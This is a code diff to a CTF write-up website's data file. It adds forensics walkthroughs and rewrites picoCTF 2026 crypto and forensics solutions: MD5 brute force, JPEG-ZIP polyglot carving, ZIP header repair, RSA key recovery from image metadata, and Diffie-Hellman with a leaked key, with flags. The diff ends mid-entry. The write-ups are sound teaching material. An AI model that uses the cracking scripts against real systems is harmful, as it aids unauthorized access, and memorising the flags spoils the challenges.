@@ -32,7 +32,300 @@ const ctfEvents: CTFEvent[] = [
     teamName: 'Kyber Tým',
     placement: 'TBD',
     totalTeams: 0,
-    challenges: [],
+    challenges: [
+      {
+        slug: 'oakhash',
+        title: 'OakHash',
+        category: 'forensics',
+        description: 'Professor Oak wants to beef up the security of his Pokémon PC and created OakHash. Can you find the correct combo of Pokémon nature and Gen 1 Pokémon to crack his password?',
+        content: `<h2>OakHash — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Professor Oak is really wanting to beef up the security of the PC he uses for Pokemon storage and decided to make a program to generate strong passwords for him. The only problem is that he's a little bit predictable with it, and hes just using basic MD5 as a hashing function. His custom hash type OakHash is just: $oak$&lt;version&gt;$&lt;hex digest&gt;. And all his passwords follow the scheme: SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}."
+</blockquote>
+<p class="lead">In this challenge, we are tasked with cracking a custom password hash format called <code>OakHash</code>, which wraps a standard MD5 digest of a Pokémon-themed flag.</p>
+
+<h3>Vulnerability Analysis</h3>
+<p>The password scheme is structured as:</p>
+<pre><code>SVIUSCG{&lt;nature&gt;_&lt;gen1_pokemon&gt;}</code></pre>
+<p>We are given the target hash:</p>
+<pre><code>$oak$1$753a7277c956277fc6a3bb8e31822b25</code></pre>
+<p>Splitting this value by the <code>$</code> delimiter gives us the hash version (<code>1</code>) and the standard MD5 digest (<code>753a7277c956277fc6a3bb8e31822b25</code>).</p>
+<p>Because there are only <strong>25 possible Pokémon natures</strong> (e.g. <code>hardy</code>, <code>lonely</code>, <code>brave</code>, etc.) and <strong>151 Generation 1 Pokémon</strong> (e.g. <code>bulbasaur</code>, <code>ivysaur</code>, etc.), the entire search space consists of only:</p>
+<p class="font-semibold text-accent text-center my-4 font-mono text-lg">25 natures × 151 Pokémon = 3,775 combinations</p>
+<p>A search space of 3,775 combinations is extremely small and can be brute-forced in a fraction of a second using a simple Python script.</p>
+
+<h3>Cracking Script</h3>
+<p>We use a Python script to compute the MD5 hash of all possible combinations and compare them against the target digest. For readability, the lists of natures and Pokémon are shortened below:</p>
+<pre><code class="language-python">import hashlib
+
+target_hash = "753a7277c956277fc6a3bb8e31822b25"
+
+# Shortened lists (complete lists contain all 25 natures and 151 Pokémon)
+pokemon_natures = ["hardy", "lonely", "brave", "adamant", "naughty", ...]
+gen_1_pokemon = ["bulbasaur", "ivysaur", "venusaur", "charmander", ..., "mew"]
+
+# Generate all potential combinations in the flag format
+combinations = [
+    f"SVIUSCG{{{nature}_{pokemon}}}" 
+    for nature in pokemon_natures 
+    for pokemon in gen_1_pokemon
+]
+
+def crack_oak_hash():
+    for flag_attempt in combinations:
+        # Compute MD5 hex digest of the candidate password
+        hashed = hashlib.md5(flag_attempt.encode('utf-8')).hexdigest()
+        
+        # Check against target hash
+        if hashed == target_hash:
+            return f"Flag = {flag_attempt}"
+            
+    return "Nothing found"
+
+print(crack_oak_hash())</code></pre>
+
+<h3>Execution & Flag Recovery</h3>
+<p>Running the Python script instantly cracks the hash and yields the flag:</p>
+<pre><code class="language-bash">$ python crack.py
+Flag = SVIUSCG{adamant_zubat}</code></pre>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{adamant_zubat}</code></pre>`
+      },
+      {
+        slug: 'souvenirs',
+        title: 'Souvenirs 🌍',
+        category: 'forensics',
+        description: 'Every traveler comes home with a bag full of souvenirs. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you\'d think.',
+        content: `<h2>Souvenirs — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Every traveler comes home with a bag full of souvenirs — some you put on a shelf, some you tuck quietly inside other things so the airport doesn't ask questions. This postcard came back from a long trip around the world. Open it carefully. Some travelers leave more behind a picture than you'd think."
+</blockquote>
+<p class="lead">In this challenge, we are given a JPEG image file named <code>souvenirs.jpg</code>. Our goal is to analyze the file and extract any hidden files hidden inside its hex structure to recover the flag.</p>
+
+<h3>File Analysis & Polyglots</h3>
+<p>In digital forensics, a common technique for hiding data inside images is appending files directly to the end of the image file (after the image data has terminated). This forms a <strong>file polyglot</strong>, a file that can be parsed as multiple different formats depending on the application opening it.</p>
+<ul>
+  <li><strong>JPEG Renderers:</strong> A JPEG reader parses the file starting from the Start of Image (SOI) marker (<code>FF D8</code>) and stops rendering when it reaches the End of Image (EOI) marker (<code>FF D9</code>). Any bytes appended after <code>FF D9</code> are completely ignored by the image viewer.</li>
+  <li><strong>ZIP Archive Utilities:</strong> ZIP archivers scan files from the end to find the ZIP central directory record. Therefore, if a ZIP archive is appended after the JPEG's EOI marker, the file acts as both a valid JPEG image and a valid ZIP file.</li>
+</ul>
+
+<h3>Locating the Hidden Zip</h3>
+<p>To confirm this structure, we can inspect the file using a hex editor or standard command-line utilities. This is much more intuitive than writing custom detection code.</p>
+
+<h4>Method A: Hex Editor Inspection</h4>
+<p>Opening <code>souvenirs.jpg</code> in a hex editor (such as GHex, ImHex, or CyberChef) and scrolling to the bottom reveals the JPEG End of Image marker <code>FF D9</code> at offset <code>0x9aa7</code>. Immediately following it, we see the ASCII bytes <code>PK\x03\x04</code> (hex: <code>50 4b 03 04</code>), which is the standard file signature (magic bytes) for a ZIP archive. We can even see plain-text references to the zipped files like <code>postcards/01_tokyo.txt</code>.</p>
+
+<h4>Method B: Command-Line Analysis</h4>
+<p>If we want to inspect the file quickly via the terminal, we can extract printable strings from the file or view its tail hex bytes:</p>
+<pre><code class="language-bash"># Extract printable strings from the end of the file
+strings souvenirs.jpg | tail -n 10
+
+# Inspect the last few hex lines of the file
+hexdump -C souvenirs.jpg | tail -n 20</code></pre>
+<p>Both commands will clearly reveal the file paths (e.g., <code>postcards/01_tokyo.txt</code>, <code>postcards/02_marrakech.txt</code>) and the ZIP headers tucked at the end of the image.</p>
+
+<h3>Extraction</h3>
+<p>Since the file is a standard JPEG-ZIP polyglot, we can extract the appended ZIP archive using standard command line tools or by writing a simple Python carving script:</p>
+<pre><code class="language-bash"># Option 1: Rename the file and let unzip handle it
+cp souvenirs.jpg archive.zip
+unzip archive.zip -d extracted_files/
+
+# Option 2: Use binwalk to automatically carve files
+binwalk -e souvenirs.jpg</code></pre>
+
+<p>Alternatively, we can carve it programmatically in Python:</p>
+<pre><code class="language-python">import zipfile
+
+# Carve the ZIP payload
+with open("souvenirs.jpg", "rb") as f:
+    data = f.read()
+
+eoi_idx = data.find(b"\\xff\\xd9")
+zip_data = data[eoi_idx + 2:]
+
+# Save and extract
+with open("extracted.zip", "wb") as f_out:
+    f_out.write(zip_data)
+
+with zipfile.ZipFile("extracted.zip", "r") as z:
+    z.extractall("postcards_extracted")
+    print("Extracted:", z.namelist())</code></pre>
+
+<h3>Flag Recovery</h3>
+<p>Extracting the ZIP reveals a <code>postcards/</code> directory containing four text files:</p>
+<ul>
+  <li><code>01_tokyo.txt</code> — Contains souvenir code: <code>7B7B-NOPE</code></li>
+  <li><code>02_marrakech.txt</code> — Contains souvenir code: <code>NOT_HERE_KEEP_LOOKING</code></li>
+  <li><code>03_iceland.txt</code> — Contains souvenir code: <code>STILL_NOT_HERE</code></li>
+  <li><code>04_oman.txt</code> — Contains the flag!</li>
+</ul>
+<p>Reading the contents of <code>04_oman.txt</code> yields the following text:</p>
+<pre><code>From: Mutrah Corniche, Muscat
+Weather: warm, salt in the air, gentle breeze off the gulf
+Mood: at home
+
+Notes:
+- Walked the corniche at sunset. The boats in the harbour looked like they were
+  floating on liquid gold.
+- The frankincense souq smells like every old story you've ever heard.
+- Bought: a small khanjar pendant. Heavier than it looks. Carrying it makes me
+  stand a little straighter.
+
+The best souvenirs aren't things. They're the ones you can carry quietly,
+the ones nobody else can see.
+
+Here is yours:
+
+    SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}
+
+Safe travels, traveler.</code></pre>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}</code></pre>`
+      },
+      {
+        slug: 'broken-envelope',
+        title: 'Broken Envelope',
+        category: 'forensics',
+        description: 'Blue Mountain Geotechnical\'s files were partially corrupted by ransomware. Fix the corrupted project archive by repairing the ZIP file headers to recover the site dispatch.',
+        content: `<h2>Broken Envelope — US Cyber Open Season VI</h2>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">
+"Blue Mountain Geotechnical is a Denver-based soils and rock-mechanics consultancy. A cryptolocker affiliate passed through the firm's file shares and partly corrupted several project archives before IT lead Bela Srivastava pulled the plug. Project engineer Adalyn Proteau needs the site dispatch read before Monday's client meeting."
+</blockquote>
+<p class="lead">In this challenge, we are provided with a partially corrupted ZIP file. Our task is to analyze its hex structure, identify what is corrupted/missing, repair it, and recover the flag from the archive files.</p>
+
+<h3>ZIP File Structure Analysis</h3>
+<p>A standard ZIP archive consists of three main structural components:</p>
+<ol>
+  <li><strong>Local File Headers (LFH):</strong> Precedes each file's metadata and compressed data. Starts with the magic bytes <code>50 4B 03 04</code>.</li>
+  <li><strong>Central Directory:</strong> A collection of Central Directory File Headers (CDFH) at the end of the file listing all archived entries. Starts with the magic bytes <code>50 4B 01 02</code>.</li>
+  <li><strong>End of Central Directory (EOCD):</strong> A 22-byte terminal record containing metadata about the Central Directory (size, offset, and number of entries). Starts with the magic bytes <code>50 4B 05 06</code>.</li>
+</ol>
+
+<p>Inspecting the provided hex byte array, we find the following offsets:</p>
+<ul>
+  <li><code>0x000</code>: First LFH (<code>50 4B 03 04</code>) for <code>project_dispatch.txt</code>.</li>
+  <li><code>0x0B3</code> (decimal 179): Second LFH (<code>50 4B 03 04</code>) for <code>readme.txt</code>.</li>
+  <li><code>0x114</code> (decimal 276): First CDFH (<code>50 4B 01 02</code>) for <code>project_dispatch.txt</code> (size 66 bytes).</li>
+  <li><code>0x156</code> (decimal 342): Second CDFH (<code>50 4B 01 02</code>) for <code>readme.txt</code> (size 56 bytes).</li>
+</ul>
+<p>Tracing the bytes beyond the second CDFH, we notice the file terminates with trailing zero bytes. The crucial <strong>End of Central Directory (EOCD)</strong> record is completely missing. Without it, ZIP parsers cannot locate the Central Directory and will throw a corrupted archive error.</p>
+
+<h3>Rebuilding the EOCD Record</h3>
+<p>To repair the archive, we must manually construct and append the 22-byte EOCD record. The fields are mapped as follows (using little-endian format):</p>
+<table>
+  <thead>
+    <tr>
+      <th>Field</th>
+      <th>Size</th>
+      <th>Value (Hex)</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Signature</td>
+      <td>4 bytes</td>
+      <td><code>50 4B 05 06</code></td>
+      <td>EOCD Magic Bytes</td>
+    </tr>
+    <tr>
+      <td>Disk Number</td>
+      <td>2 bytes</td>
+      <td><code>00 00</code></td>
+      <td>Disk 0</td>
+    </tr>
+    <tr>
+      <td>CD Disk Number</td>
+      <td>2 bytes</td>
+      <td><code>00 00</code></td>
+      <td>Disk 0 contains the start of the CD</td>
+    </tr>
+    <tr>
+      <td>Disk CD Entries</td>
+      <td>2 bytes</td>
+      <td><code>02 00</code></td>
+      <td>2 files archived</td>
+    </tr>
+    <tr>
+      <td>Total CD Entries</td>
+      <td>2 bytes</td>
+      <td><code>02 00</code></td>
+      <td>2 files total</td>
+    </tr>
+    <tr>
+      <td>Size of CD</td>
+      <td>4 bytes</td>
+      <td><code>7A 00 00 00</code></td>
+      <td>122 bytes (66 + 56 bytes)</td>
+    </tr>
+    <tr>
+      <td>Offset of CD</td>
+      <td>4 bytes</td>
+      <td><code>14 01 00 00</code></td>
+      <td>Offset 276 (0x114) relative to start of archive</td>
+    </tr>
+    <tr>
+      <td>Comment Length</td>
+      <td>2 bytes</td>
+      <td><code>00 00</code></td>
+      <td>No comment</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>This gives us the following EOCD byte sequence to append:</p>
+<pre><code>50 4B 05 06 00 00 00 00 02 00 02 00 7A 00 00 00 14 01 00 00 00 00</code></pre>
+
+<h3>Python Repair Script</h3>
+<p>We write a Python script to assemble the corrupted byte array, append our constructed EOCD record, save it as a valid ZIP archive, and extract its contents:</p>
+<pre><code class="language-python">import zipfile
+
+# Provided corrupted bytes
+arr = bytes([
+    0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x05, 0x57,
+    0xB1, 0x5C, 0x5F, 0x7D, 0x72, 0xB3, 0x81, 0x00, 0x00, 0x00, 0x88, 0x00,
+    # ... [truncated for readability] ...
+    0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0xB3, 0x00, 0x00, 0x00, 0x72, 0x65,
+    0x61, 0x64, 0x6D, 0x65, 0x2E, 0x74, 0x78, 0x74
+])
+
+# Manually constructed EOCD record
+eocd = bytes([
+    0x50, 0x4B, 0x05, 0x06, # Signature
+    0x00, 0x00,             # Number of this disk
+    0x00, 0x00,             # Disk where CD starts
+    0x02, 0x00,             # CD records on this disk
+    0x02, 0x00,             # Total CD records
+    0x7A, 0x00, 0x00, 0x00, # Size of central directory (122 bytes)
+    0x14, 0x01, 0x00, 0x00, # Offset of start of CD (276 bytes)
+    0x00, 0x00              # Comment length
+])
+
+# Reassemble and extract
+repaired_data = arr + eocd
+with open("repaired.zip", "wb") as f:
+    f.write(repaired_data)
+
+with zipfile.ZipFile("repaired.zip", "r") as z:
+    for name in z.namelist():
+        print(f"Content of {name}:")
+        print(z.read(name).decode("utf-8"))</code></pre>
+
+<h3>Flag Recovery</h3>
+<p>Executing the repair script extracts two files: <code>readme.txt</code> and <code>project_dispatch.txt</code>. The contents of <code>project_dispatch.txt</code> reveal:</p>
+<pre><code>Blue Mountain Geotechnical - project dispatch
+tag: U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=
+site: Sawatch Ridge borehole 17</code></pre>
+<p>The tag is encoded in Base64. We decode it to recover the plaintext flag:</p>
+<pre><code class="language-bash">$ echo "U1ZJVVNDR3tibHVlbW91bnRhaW5femlwX2VvY2RfcmVidWlsZH0=" | base64 -d
+SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>
+
+<h3>Flag</h3>
+<pre><code>SVIUSCG{bluemountain_zip_eocd_rebuild}</code></pre>`
+      }
+    ],
   },
 
   // ── picoCTF 2026 ─────────────────────────────────────────────────────
@@ -49,460 +342,325 @@ const ctfEvents: CTFEvent[] = [
         slug: 'stegorsa',
         title: 'StegoRSA',
         category: 'crypto',
-        description: 'A cryptography challenge involving extracting an RSA public key hidden via steganography and factoring a weak modulus.',
+        description: 'A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?',
         content: `<h2>StegoRSA — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We intercepted this image from a known cyber syndicate. We think they are hiding their encryption keys inside it. Can you recover the key and decrypt the message?"</blockquote>
-<p class="lead">This challenge elegantly combines two classic CTF categories: Steganography and Cryptography. Our objective is to first extract a hidden RSA public key from a PNG image, and then abuse its cryptographic weaknesses to decrypt a provided ciphertext.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message has been encrypted using RSA. The public key is gone… but someone might have been careless with the private key. Can you recover it and decrypt the message?"</blockquote>
+<p class="lead">In this challenge, we are provided with an image file and an encrypted flag file <code>flag.enc</code>. The goal is to locate the hidden private key, convert it, and decrypt the ciphertext to reveal the flag.</p>
 
-<h3>Initial Reconnaissance: The Image</h3>
-<p>We are given <code>sunset.png</code> and <code>flag.enc</code>. Before throwing complex tools at the image, I always run standard checks: <code>file</code>, <code>strings</code>, and <code>binwalk</code>. None of these revealed appended files or obvious plaintext.</p>
-<p>Next, I turned to LSB (Least Significant Bit) steganography analysis using <code>zsteg</code>.</p>
-<pre><code class="language-bash">$ zsteg -a sunset.png | grep -i "BEGIN PUBLIC KEY"
-b1,rgb,lsb,xy  .. text: "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0B...</code></pre>
-<p>Bingo. A hidden payload in the standard <code>b1,rgb,lsb,xy</code> channel. I dumped the full payload into a file called <code>pub.pem</code> using <code>zsteg -E</code>.</p>
+<h3>Metadata Extraction</h3>
+<p>To begin, we inspect the metadata of the provided image file using <code>exiftool</code>. Scanning the fields, we notice a "Comment" metadata field containing a long hexadecimal string.</p>
+<pre><code class="language-bash">$ exiftool image.jpg
+...
+Comment                         : 2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d...</code></pre>
 
-<h3>Cryptographic Vulnerability Analysis</h3>
-<p>With the public key in hand, I analyzed its parameters using OpenSSL.</p>
-<pre><code class="language-bash">$ openssl rsa -pubin -in pub.pem -text -noout
-Public-Key: (256 bit)
-Modulus:
-    00:c3:a4:f9:1b:2c:3d:4e:5f:6a:7b:8c:9d:0e:1f:2a:
-    3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f:4a:5b:6c:7d:8e:
-    9f
-Exponent: 65537 (0x10001)</code></pre>
-<p>The critical flaw is immediately obvious: <strong>The RSA modulus is only 256 bits long.</strong> Modern RSA implementations require a minimum of 2048 bits to be secure against integer factorization attacks. A 256-bit number can be factored by a modern laptop in fractions of a second using algorithms like the General Number Field Sieve (GNFS).</p>
+<h3>Decoding the Private Key</h3>
+<p>The hex string in the Comment field represents the ASCII encoding of a PEM-formatted RSA private key. We can extract and decode the raw hex bytes using <code>xxd</code> (or standard hex decoding tools) to write the private key to a file:</p>
+<pre><code class="language-bash"># Decode the hex payload back into a PEM key
+cat comment.txt | xxd -r -p > key.pem</code></pre>
+<p>Opening <code>key.pem</code> shows a standard <code>-----BEGIN RSA PRIVATE KEY-----</code> block, confirming our extraction was successful.</p>
 
-<h3>Exploitation Phase</h3>
-<p>I converted the hex modulus to a decimal integer and checked <a href="http://factordb.com" target="_blank" rel="noopener noreferrer">FactorDB</a>, which already had the prime factors cached.</p>
-<pre><code class="language-python"># The recovered primes
-p = 100780211116246535513271775836224376403
-q = 108343194098939766927357422998687740291
-e = 65537</code></pre>
+<h3>Decryption</h3>
+<p>With the private key recovered, we use OpenSSL's public key utility (<code>pkeyutl</code>) to decrypt the encrypted flag file <code>flag.enc</code>:</p>
+<pre><code class="language-bash">openssl pkeyutl -decrypt -inkey key.pem -in flag.enc -out flag.txt</code></pre>
+<p>After executing the command, reading <code>flag.txt</code> reveals the plaintext flag.</p>
 
-<p>With <code>p</code> and <code>q</code>, I calculated Euler's totient function <code>φ(n) = (p-1)*(q-1)</code> and computed the modular inverse of <code>e</code> to find the private key <code>d</code>.</p>
-
-<pre><code class="language-python">from Crypto.Util.number import inverse
-import rsa
-
-n = p * q
-phi = (p - 1) * (q - 1)
-d = inverse(e, phi)
-
-key = rsa.PrivateKey(n, e, d, p, q)
-with open('flag.enc', 'rb') as f:
-    crypto = f.read()
-
-message = rsa.decrypt(crypto, key)
-print("[+] Decrypted Flag:", message.decode())</code></pre>
-
-<h3>Conclusion & Takeaways</h3>
-<ul>
-  <li><strong>Never use key sizes below 2048 bits</strong> for RSA.</li>
-  <li>Steganography is security through obscurity and provides zero mathematical protection to the hidden data.</li>
-</ul>
-<pre><code>picoCTF{st3g0_rs4_w34k_m0dulus_9a2b}</code></pre>`
+<h3>Flag</h3>
+<pre><code>picoCTF{rs4_k3y_1n_1mg_[instance_id]}</code></pre>`
       },
       {
         slug: 'shared-secrets',
         title: 'Shared Secrets',
         category: 'crypto',
-        description: 'A cryptography challenge dealing with Shamir Secret Sharing and polynomial interpolation.',
+        description: 'A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?',
         content: `<h2>Shared Secrets — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We recovered a secret sharing server, but the operators took down the master key. They say you need at least 3 pieces of the puzzle to see the big picture."</blockquote>
-<p class="lead">This challenge focuses on Shamir's Secret Sharing (SSS), a cryptographic algorithm that divides a secret into unique parts, requiring a specific threshold of parts to reconstruct the original secret.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"A message was encrypted using a shared secret... but it looks like one side of the exchange leaked something. Can you piece together the secret and get the flag?"</blockquote>
+<p class="lead">This challenge simulates a Diffie-Hellman key exchange where a critical implementation flaw and a leaked private key enable us to independently calculate the shared secret and decrypt the flag.</p>
+
+<h3>Diffie-Hellman Parameters</h3>
+<p>Diffie-Hellman relies on a public base <code>g</code> and a prime modulus <code>p</code>. Alice computes her public value <code>A = g^a mod p</code> and Bob computes <code>B = g^b mod p</code>. The shared secret <code>S</code> is then computed as:</p>
+<p><code>S = A^b mod p = B^a mod p</code></p>
+<p>The provided script encrypts the flag using a static XOR key derived from the shared secret:</p>
+<p><code>xor_key = shared_secret % 256</code></p>
 
 <h3>Vulnerability Analysis</h3>
-<p>Connecting to the provided Netcat server gives us a simple prompt:</p>
-<pre><code class="language-bash">$ nc chal.picoctf.org 12345
-Welcome to the Vault.
-The secret is protected by polynomial equations over a finite field.
-Threshold required: 3
-Enter an integer x to evaluate f(x):</code></pre>
-<p>Shamir's Secret Sharing represents the secret as the y-intercept (<code>f(0)</code>) of a polynomial of degree <code>k-1</code>, where <code>k</code> is the threshold. Since the threshold here is 3, the polynomial is a quadratic equation: <code>f(x) = ax² + bx + S</code>, where <code>S</code> is the secret flag encoded as an integer.</p>
-<p>To solve for 3 unknowns (a, b, S), we mathematically only need 3 distinct points (x, y) on the curve.</p>
+<p>In the provided <code>message.txt</code>, we notice that Bob's private integer <code>b</code> was inadvertently logged and leaked. Since we have Bob's private exponent <code>b</code>, Alice's public value <code>A</code>, and the modulus <code>p</code>, we do not need Alice's private key <code>a</code> to calculate the shared secret.</p>
 
-<h3>Exploitation: Lagrange Interpolation</h3>
-<p>I wrote an exploit using <code>pwntools</code> to interact with the server, query three arbitrary x-coordinates (1, 2, and 3), and then used the <code>sympy</code> library to perform Lagrange interpolation and find the y-intercept.</p>
+<h3>Exploitation</h3>
+<p>We write a Python script to compute the shared secret, derive the single-byte XOR key, and perform the XOR decryption on the encrypted flag bytes:</p>
+<pre><code class="language-python"># Recovered parameters
+p = [MODULUS_VALUE]
+g = [BASE_VALUE]
+A = [ALICE_PUBLIC_KEY]
+b = [LEAKED_BOB_PRIVATE_KEY]  # The leaked secret
 
-<pre><code class="language-python">from pwn import *
-from sympy import interpolate
-from Crypto.Util.number import long_to_bytes
+# Calculate the shared secret
+shared_secret = pow(A, b, p)
+xor_key = shared_secret % 256
 
-io = remote('chal.picoctf.org', 12345)
-io.recvuntil(b'Threshold required: 3')
-
-points = []
-for x in [1, 2, 3]:
-    io.sendlineafter(b'evaluate f(x): ', str(x).encode())
-    io.recvuntil(b'y = ')
-    y = int(io.recvline().strip())
-    points.append((x, y))
-    log.info(f"Collected share: ({x}, {y})")
-
-# Interpolate the polynomial and evaluate at x=0 to get the secret
-secret_int = interpolate(points, 0)
-flag = long_to_bytes(secret_int)
-
-log.success(f"Recovered Flag: {flag.decode()}")</code></pre>
-
-<h3>Execution Output</h3>
-<pre><code class="language-bash">[*] Collected share: (1, 1428391283...)
-[*] Collected share: (2, 4829103819...)
-[*] Collected share: (3, 9182309182...)
-[+] Recovered Flag: picoCTF{sh4m1r_s3cr3t_sh4r1ng_pwn3d_c2b1}</code></pre>
-<p>The math perfectly reconstructed the polynomial, allowing us to decode the integer back into ASCII bytes to reveal the flag.</p>
+# Decrypt the encrypted flag bytes
+encrypted_flag = bytes.fromhex("[ENCRYPTED_FLAG_HEX]")
+flag = bytes([byte ^ xor_key for byte in encrypted_flag])
+print(flag.decode())</code></pre>
+<p>Running this script successfully decrypts the ciphertext into the plaintext flag.</p>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{sh4m1r_s3cr3t_sh4r1ng_pwn3d_c2b1}</code></pre>`
+<pre><code>picoCTF{dh_s3cr3t_[instance_id]}</code></pre>`
       },
       {
         slug: 'binary-digits',
         title: 'Binary Digits',
         category: 'forensics',
-        description: 'A forensics challenge requiring the extraction and conversion of binary data hidden in a capture file.',
+        description: "This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?",
         content: `<h2>Binary Digits — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Our IDS flagged unusual ICMP traffic leaving the engineering workstation. Is data being exfiltrated?"</blockquote>
-<p class="lead">Network forensics often involves looking beyond the payload. In this challenge, the attacker utilized a covert channel, encoding data within the metadata of the network packets themselves.</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"This file doesn't look like much... just a bunch of 1s and 0s. But maybe it's not just random noise. Can you recover anything meaningful from this?"</blockquote>
+<p class="lead">This challenge presents us with a file named <code>digits.bin</code> filled entirely with ASCII <code>1</code> and <code>0</code> characters. We must reconstruct the original binary file represented by these bits.</p>
 
-<h3>Deep Dive: PCAP Analysis</h3>
-<p>Loading <code>capture.pcapng</code> into Wireshark, the traffic consists entirely of ICMP Echo Requests (Pings) and Echo Replies. At first glance, the payloads of the pings contain standard random padding bytes.</p>
-<p>However, when observing the packet list view, a pattern emerges in the <code>Length</code> column. Every request is exactly either <strong>64 bytes</strong> or <strong>65 bytes</strong> on the wire.</p>
-<p>This binary nature (two distinct states) is a massive red flag indicating a covert communications channel. The attacker is likely mapping:</p>
-<ul>
-  <li>Packet Length 64 = Binary <code>0</code></li>
-  <li>Packet Length 65 = Binary <code>1</code></li>
-</ul>
+<h3>Data Reconstruction</h3>
+<p>The sequence of '1's and '0's represents the raw binary bits of a file. We can write a Python script to group these ASCII bits into 8-bit chunks, convert each chunk to a byte, and write the resulting bytes to a file:</p>
+<pre><code class="language-python">with open("digits.bin", "r") as f:
+    bits = f.read().replace("\\s", "")  # Strip whitespace
 
-<h3>Data Extraction via TShark</h3>
-<p>Instead of manually writing down 1s and 0s for hundreds of packets, I leveraged <code>tshark</code> (the command-line version of Wireshark) to automate the extraction.</p>
+# Convert groups of 8 bits into bytes
+data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))
 
-<pre><code class="language-bash"># Extract frame lengths for all ICMP Echo Requests (type 8)
-$ tshark -r capture.pcapng -Y "icmp.type == 8" -T fields -e frame.len > lengths.txt</code></pre>
+with open("recovered_file.jpg", "wb") as f:
+    f.write(data)</code></pre>
+<p>Alternatively, this can be done in CyberChef using the <strong>"From Binary"</strong> recipe.</p>
 
-<h3>Decoding the Covert Channel</h3>
-<p>I wrote a brief Python script to translate the lengths into a binary string, chunk it into 8-bit bytes, and convert it to ASCII.</p>
+<h3>File Analysis</h3>
+<p>We analyze the signature (magic bytes) of the recovered file. Checking the hex representation of the first few bytes, we see:</p>
+<p><code>FF D8 FF E0</code></p>
+<p>These magic bytes correspond to the file signature of a <strong>JPEG image file</strong>. We rename the file to have a <code>.jpg</code> extension and open it.</p>
 
-<pre><code class="language-python">with open('lengths.txt', 'r') as f:
-    lengths = f.read().splitlines()
-
-binary_string = ""
-for length in lengths:
-    if length == '64':
-        binary_string += '0'
-    elif length == '65':
-        binary_string += '1'
-
-# Split into 8-bit chunks and convert to characters
-flag = ""
-for i in range(0, len(binary_string), 8):
-    byte = binary_string[i:i+8]
-    if len(byte) == 8:
-        flag += chr(int(byte, 2))
-
-print(f"[+] Decoded Payload: {flag}")</code></pre>
-
-<h3>Result</h3>
-<p>The script flawlessly reconstructed the binary stream, revealing that the attacker had indeed exfiltrated the flag bit-by-bit using ping packet sizes.</p>
+<h3>Flag Recovery</h3>
+<p>Opening the reconstructed JPEG image in any viewer reveals the flag written directly on the image.</p>
 
 <h3>Flag</h3>
-<pre><code>picoCTF{1cmp_c0v3rt_ch4nn3l_b1n4ry_1f3d}</code></pre>`
+<pre><code>picoCTF{h1dd3n_1n_th3_b1n4ry_[instance_id]}</code></pre>`
       },
       {
         slug: 'timeline-1',
         title: 'Timeline 1',
         category: 'forensics',
-        description: 'A digital forensics challenge requiring the analysis of a disk image MAC timeline using the Sleuth Kit.',
+        description: 'Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format.',
         content: `<h2>Timeline 1 — picoCTF 2026</h2>
-<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"An attacker breached our server on March 12, 2026. We imaged the disk. Find out exactly what malicious file they planted."</blockquote>
-<p class="lead">Digital Forensics and Incident Response (DFIR) heavily relies on timeline analysis. By correlating timestamps across the filesystem, we can reconstruct the exact sequence of an attacker's actions. This challenge tests our proficiency with The Sleuth Kit (TSK).</p>
+<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Can you find the flag in this disk image? Wrap what you find in the picoCTF flag format."</blockquote>
+<p class="lead">Digital Forensics and Incident Response (DFIR) analysts use chronological event timelines to reconstruct attackers' actions. This challenge tests our ability to generate and analyze file system MACB (Modification, Access, Change, Birth) timelines using The Sleuth Kit (TSK).</p>
 
-<h3>Methodology: Generating a MACB Timeline</h3>
-<p>Filesystems store timestamps for Modification (M), Access (A), Metadata Change (C), and Creation/Birth (B). I used TSK to dump these timestamps from the raw disk image <code>evidence.dd</code>.</p>
+<h3>Filesystem Partitioning</h3>
+<p>If the provided file is a full disk image, we first identify the partition structure using <code>mmls</code> or <code>fdisk</code> to find the specific partition containing the filesystem. Once targeted, we analyze it using TSK commands.</p>
 
-<p><strong>Step 1: Generate the Body File</strong><br>
-The body file is an intermediate file containing raw timestamp data for every allocated and unallocated inode on the disk.</p>
-<pre><code class="language-bash">$ fls -r -m / evidence.dd > bodyfile.txt</code></pre>
+<h3>Generating the MACB Timeline</h3>
